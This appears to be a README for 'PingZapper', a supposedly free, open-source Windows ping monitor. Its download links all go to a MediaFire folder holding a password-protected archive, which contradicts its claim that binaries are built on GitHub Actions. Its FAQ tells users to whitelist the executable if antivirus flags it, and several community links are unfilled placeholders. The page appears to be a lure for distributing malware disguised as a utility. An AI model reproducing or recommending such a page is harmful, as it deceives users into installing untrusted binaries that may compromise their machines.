<div align="center">

<img src="assets/banner.png" alt="PingZapper" width="100%"/>

# 🏓 PingZapper

**Free, open-source ping monitor for Windows — continuous latency graphs per server, jitter stats, tray alerts.**

![Version](https://img.shields.io/github/v/release/coalcuckoodwell/ping-zapper?style=flat-square&color=blue)
![Build](https://img.shields.io/github/actions/workflow/status/coalcuckoodwell/ping-zapper/ci.yml?branch=main&style=flat-square&label=build)
![Downloads](https://img.shields.io/github/downloads/coalcuckoodwell/ping-zapper/total?style=flat-square&color=green)
![Stars](https://img.shields.io/github/stars/coalcuckoodwell/ping-zapper?style=flat-square&color=yellow)
![License](https://img.shields.io/github/license/coalcuckoodwell/ping-zapper?style=flat-square)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-blue?style=flat-square)

[⬇️ Download Latest Release](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) · [📚 Docs](docs/) · [💬 Discord](https://discord.gg/yourinvite) · [🐛 Report Bug](.github/ISSUE_TEMPLATE/bug_report.md)

</div>

---


## Download

| Source | Link |
|---|---|
| 💾 **Installer ping-zapper** | [Installer ping-zapper](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`
## ✨ Features

✅ **Continuous Ping Graphs**
✅ **Jitter & Packet Loss %**
✅ **Multi-Server Watch**
✅ **Tray Alerts** — threshold spikes
✅ **Traceroute Integration**
✅ **Game Server Presets**
✅ **~8 MB RAM**
✅ **No Telemetry**


## 📸 Screenshots

| Main Window | Settings | Results |
|:---:|:---:|:---:|
| ![Main](assets/screenshots/main.png) | ![Settings](assets/screenshots/settings.png) | ![Results](assets/screenshots/results.png) |

### 🎬 Live Demo

![ping-zapper Demo](assets/gifs/demo.gif)

## 🚀 Installation

> Requires Windows 10 (1909+) or Windows 11. Free, ~50 MB.

**[⬇️ Download ping-zapper-Setup.exe ](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer)**

```powershell
winget install ping-zapper
```

Full step-by-step guide: **[docs/installation.md](docs/installation.md)**

## ⚔️ How It Compares

| Feature | **PingZapper OSS** | PingPlotter | PingInfoView |
|---|:---:|:---:|:---:|
| Price | **Free, MIT** | $39.95 | Free |
| Open source | ✅ | ❌ | ❌ |
| Jitter stats | ✅ | ✅ | ❌ |
| Tray alerts | ✅ | ✅ | ❌ |
| Graphs | ✅ Live | ✅ | ✅ |
| Portable | ✅ | ✅ | ✅ |


## 📋 Changelog

### [1.2.0] — 2026-09-25

### Added
- Per-scenario profiles with auto-apply
- Global hotkeys (toggle, panic restore)
- Portable mode (`--portable`)
- Built-in status dashboard

### Changed
- Faster startup (~150ms cold start)
- Reduced memory footprint

### Fixed
- Settings not persisting after reboot in portable mode

## [1.1.0] — 2026-08-12

### Added
- Import/export of community presets
- Dark & light themes
- CLI mode for scripting

### Fixed
- High-DPI scaling on 125% displays

## [1.0.0] — 2026-06-20

### Added
- 🎉 Initial public release
- Core engine, hotkeys, tray icon, settings UI


Full history: [CHANGELOG.md](CHANGELOG.md)

## ❓ FAQ

<details>
<summary><b>Is it safe? Do I need to disable my antivirus?</b></summary>

Yes, it's safe, and **no, you never need to disable your antivirus**. The app is fully open source — every line is auditable here. Binaries are built automatically by GitHub Actions from this exact code (see the green build badge) with published SHA-256 hashes. If your antivirus flags the portable exe, it's a heuristic false positive — [verify the hash and whitelist it](docs/troubleshooting.md#antivirus-false-positive).
</details>

<details>
<summary><b>Is it really free?</b></summary>

100%. MIT license, no ads, no account, no upsell. If you like it, [sponsor the project](https://github.com/sponsors/yourname).
</details>

<details>
<summary><b>Which Windows versions are supported?</b></summary>

Windows 10 build 18363+ and Windows 11, x64. Windows Server 2019+ works but is untested.
</details>

<details>
<summary><b>Will this lower my ping?</b></summary>

No — it measures and diagnoses. It shows you where latency comes from (your ISP hop vs the game server), so you can pick better servers or prove an ISP problem. Lowering ping requires routing changes, which is out of scope and out of fairness.
</details>

## 💬 Community

[![Discord](https://img.shields.io/badge/Discord-Join%20Server-5865F2?style=flat-square&logo=discord&logoColor=white)](https://discord.gg/yourinvite)
[![Telegram](https://img.shields.io/badge/Telegram-Channel-26A5E4?style=flat-square&logo=telegram&logoColor=white)](https://t.me/ping-zapper)
[![YouTube](https://img.shields.io/badge/YouTube-Tutorials-FF0000?style=flat-square&logo=youtube&logoColor=white)](https://youtube.com/@ping-zapper)

- 💬 **Discord** — support, presets sharing, beta builds
- 📢 **Telegram** — release announcements
- 🎥 **YouTube** — setup and tuning guides

## ❤️ Support the Project

ping-zapper is free and will always be. If it's useful to you, consider sponsoring:

[![Sponsor](https://img.shields.io/badge/%E2%9D%A4-Sponsor%20on%20GitHub-ff69b4?style=flat-square)](https://github.com/sponsors/yourname)

Also: ⭐ star the repo, 🐛 [report bugs](../../issues), 🌐 [translate](CONTRIBUTING.md), 👨‍💻 [contribute code](CONTRIBUTING.md).

## ⭐ Star History

[![Star History Chart](https://api.star-history.com/svg?repos=coalcuckoodwell/ping-zapper&type=Date)](https://star-history.com/#coalcuckoodwell/ping-zapper&Date)

---

<div align="center">

**⭐ If ping-zapper helps you, a star is the best "thank you" — it helps others find the tool. ⭐**

Made with 🛠 by the community · Licensed under [MIT](LICENSE)

</div>
